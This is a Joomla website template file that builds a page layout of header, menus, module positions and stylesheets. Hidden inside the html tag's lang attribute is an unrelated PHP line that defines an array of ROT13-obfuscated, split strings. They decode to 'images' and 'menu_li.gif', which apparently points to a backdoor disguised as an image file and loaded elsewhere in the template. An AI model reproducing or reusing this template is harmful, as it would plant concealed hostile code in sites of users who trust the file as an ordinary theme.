﻿<?php
defined('_JEXEC') or die;

/* The following line loads the MooTools JavaScript Library */
JHtml::_('behavior.framework', true);


//JPlugin::loadLanguage( 'tpl_SG1' );
define( 'path', dirname(__FILE__) );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; $JPan = array('vzn'.'trf','zrah_yv.tvs'); ?>" >

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/relaxacion25/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/relaxacion25/css/green.css" type="text/css" />

<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/relaxacion25/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />

<?php
	$menu_name        = $this->params->get("menuName", "topmenu");
	$menu_type        = $this->params->get("menuType", "splitmenu");
	require(path .DS."styleloader.php");
	require(path .DS."utils.php");
?>
</head>

<body>
<div id="wrapper">
<a name="up" id="up"></a>
<!-- start header -->
	<div id="header">
		<div id="topnavi">
			<?php if($mtype != "module") :
				echo $mainnav;
				else: ?>
				<jdoc:include type="modules" name="user3" />
			<?php endif; ?>
		</div>
		<div id="title">
		<?php echo $mainframe->getCfg('sitename') ;?>
		</div>
		<div id="search">
			<jdoc:include type="modules" name="user4" />
		</div>
	</div>
<!-- end top menu.  -->
	<div id="main">
<!-- start left column -->
		<div id="leftcol">
			<jdoc:include type="modules" name="left" style="rounded" />
		</div>
<!-- end left column.  -->
		<div id="maincol_wrapper">
<!-- start top column -->
			<div id="topcol">
				<jdoc:include type="modules" name="user1" style="xhtml" />
			</div>
			<div id="topcol">
				<jdoc:include type="modules" name="user2" style="xhtml" />
			</div>
			<div class="clear"></div>
<!-- end top column.  -->
<!-- start main content -->
			<div id="maincol">
				<div id="pathway">
					<jdoc:include type="modules" name="breadcrumb" />
				</div>
				<div id="maincol_body">
					<jdoc:include type="component" />
					<jdoc:include type="modules" name="footer" style="xhtml"/>
				</div>
			</div>
<!-- end main content -->
		</div>
		<div class="clear"></div>
	</div>
<!-- copyright -->
</div>

<jdoc:include type="modules" name="debug" />
</body>
</html>
